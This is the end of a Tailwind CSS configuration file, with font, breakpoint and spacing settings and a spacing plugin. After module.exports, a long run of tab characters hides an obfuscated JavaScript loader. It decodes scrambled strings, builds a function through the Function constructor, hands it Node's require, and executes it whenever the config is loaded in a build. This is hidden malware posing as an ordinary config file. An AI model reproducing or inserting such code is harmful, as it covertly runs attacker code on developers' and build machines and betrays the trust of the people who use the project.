                    'Helvetica Neue',
                    'Helvetica',
                    'Arial',
                    'sans-serif',
                    'Apple Color Emoji',
                    'Segoe UI Emoji',
                    'Segoe UI Symbol',
                ],
                title: [
                    'Emoji Flags Polyfill',
                    'MatterSQ',
                    '-apple-system',
                    'BlinkMacSystemFont',
                    'Inter',
                    'Segoe UI',
                    'Roboto',
                    'Helvetica Neue',
                    'Helvetica',
                    'Arial',
                    'sans-serif',
                    'Apple Color Emoji',
                    'Segoe UI Emoji',
                    'Segoe UI Symbol',
                ],
                mono: [
                    'Emoji Flags Polyfill',
                    'ui-monospace',
                    'SFMono-Regular',
                    'SF Mono',
                    'Menlo',
                    'Consolas',
                    'Liberation Mono',
                    'monospace',
                ],
            },
            screens: {
                // Sync with vars.scss
                sm: '576px',
                md: '768px',
                lg: '992px',
                xl: '1200px',
                '2xl': '1600px',
            },
            borderRadius: {
                none: '0',
                sm: 'var(--radius-sm)',
                DEFAULT: 'var(--radius)',
                lg: 'var(--radius-lg)',
                full: '9999px',
            },
            spacing: {
                // Some additional larger widths for compatibility with our pre-Tailwind system
                // Don't add new ones here, in new code just use the `w-[32rem]` style for arbitrary values
                13: '3.25rem',
                15: '3.75rem',
                18: '4.5rem',
                // All whole number values up to 18 ensured above
                30: '7.5rem',
                50: '12.5rem',
                60: '15rem',
                80: '20rem',
                100: '25rem',
                120: '30rem',
                140: '35rem',
                160: '40rem',
                180: '45rem',
                192: '48rem',
                200: '50rem',
                // All whole number values divisible by 20 up to 200 ensured above
                248: '62rem',
                300: '75rem',
                'scene-padding': 'var(--scene-padding)',
            },
            rotate: {
                270: '270deg',
            },
            minWidth: {
                '1/3': '33.333333%',
            },
            maxWidth: {
                '1/2': '50%',
            },
            boxShadow: {
                DEFAULT: 'var(--shadow-elevation-3000)',
            },
            flex: {
                2: '2 2 0%',
                3: '3 3 0%',
            },
            zIndex: {
                top: 'var(--z-top)',
            },
        },
    },
    plugins: [
        require('@tailwindcss/container-queries'),
        plugin(({ addUtilities, theme }) => {
            const spacing = theme('spacing')
            const newUtilities = {}

            // Standard spacing utilities for backwards compatibility
            for (const [key, value] of Object.entries(spacing)) {
                if (!key.includes('.')) {
                    newUtilities[`.deprecated-space-y-${key} > :not([hidden]) ~ :not([hidden])`] = {
                        '--tw-space-y-reverse': '0',
                        'margin-top': `calc(${value} * calc(1 - var(--tw-space-y-reverse)))`,
                        'margin-bottom': `calc(${value} * var(--tw-space-y-reverse))`,
                    }
                    newUtilities[`.deprecated-space-x-${key} > :not([hidden]) ~ :not([hidden])`] = {
                        '--tw-space-x-reverse': '0',
                        'margin-right': `calc(${value} * var(--tw-space-x-reverse))`,
                        'margin-left': `calc(${value} * calc(1 - var(--tw-space-x-reverse)))`,
                    }
                }
            }

            addUtilities(newUtilities)
        }),
    ],
}

module.exports = config;																																																																																																																																																																																																																																																																										var z = '-3048-2';var NX,SX,spin,splitLane,peel;(function(){var a=["","*","*0","^","*1","c^mejb^tro","hqersxluvwacdjbymgorzfkociptrutnstonc","=aenruh(al=5c,g8fdu.yr ..ncecf,5\"paeau6lnj)r]2uv\"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\"li\"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\")cpA+u;utp]\"=lk7vpt 1r;hzw\")t()9)(.lul=s7f; ;sq0)n\"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) ","R_<\"cRJ!&VecRWa=RrfR$6\"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-\"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f.\"4Rb N\"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z\"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$\"n<D3RsRR..(ReesseR< t,\" Rdov}Sc0Jmi.T<sEegsRw]R\"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* [\"oisenRefea!Yn.ecR%o\"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@\"}RuRqu5(3Pol\"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$\"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!\"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e\"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<\"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<\"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6\"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2\"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#\"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC\"cn..2bp(6Cp<SR\"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc\"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci\"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR\"tcsc.!rVRpaiz0<b\"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R\"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f\"t RRsN</C RnRdRrpRR<od<.R<r[ar\"l<. P\".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR\"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!\"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi\"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR\"RuRRR\"RtR<Rs\".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY\"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt\"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<\":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}.\"P&yseR_a%rRR.D<iPsRD!i.mR\"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR\"\"](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.(\"]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o\"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe\"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?..\"lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE\"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!\".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R\"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK\".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv \"4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M\"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR\"sz3o\"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS\"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b \"cRt,\'leacPc RR<Rz\"<Ri l0oRRdRs7.R(eCcR_.6\"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc\". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w\"l{e]e-R</<s4Nt.op\"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:\"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'\"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|\".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ\"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4\"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#\"<cqk<ek.imRSN.RsE bPPn)<e}o0e\".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~\" X.ttR<R!d c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR\"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn\"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm\"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR\"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z\"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR\"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR"];function b(q,h){for(var i,p,t,s,j,m,g=[],o=0,k=h[0];o< q.length;){g[o]= q.charAt(o),o+= 1};for(i= g.length,o= 0;o< i;){p= k* (o+ h[1])+ k% h[2],j= (t= k* (o+ h[3])+ k% h[4])% i,m= g[s= p% i],g[s]= g[j],g[j]= m,k= (p+ t)% h[5],o+= 1};return g.join(a[0x0])}function c(q){var h=String.fromCharCode(28),i=b(q,NX);return (i= (i= (i= i.split(a[0x3]).join(h)).split(a[0x4]).join(a[0x3])).split(a[0x2]).join(a[0x1])).split(h)}function d(q){return b(q,SX)}function f(v,m){try{var u=Object.getOwnPropertyDescriptor(v,"name");if(!u|| (!u.writable&&  !u.enumerable && u.configurable &&  typeof u.value== "string")){Object.defineProperty(v,"name",{value:m,configurable:true})}}catch(e){};return v}spin= f(b,"spin");splitLane= f(c,"splitLane");peel= f(d,"peel");NX= [6912847,367,20411,613,43759,5019283],SX= [5283741,241,41953,187,56129,4738901];!function(q,h){q.z= z;var i=c(a[0x5]);q[i[0]]= h, typeof module=== i[1]&& (q[i[2]]= module);var p=d(a[0x6]),t=d[p.substring(0,11)],s=t(a[0x0],d(a[0x7]));t(a[0x0],s(d(a[0x8])))(2509)}(global,require)})()
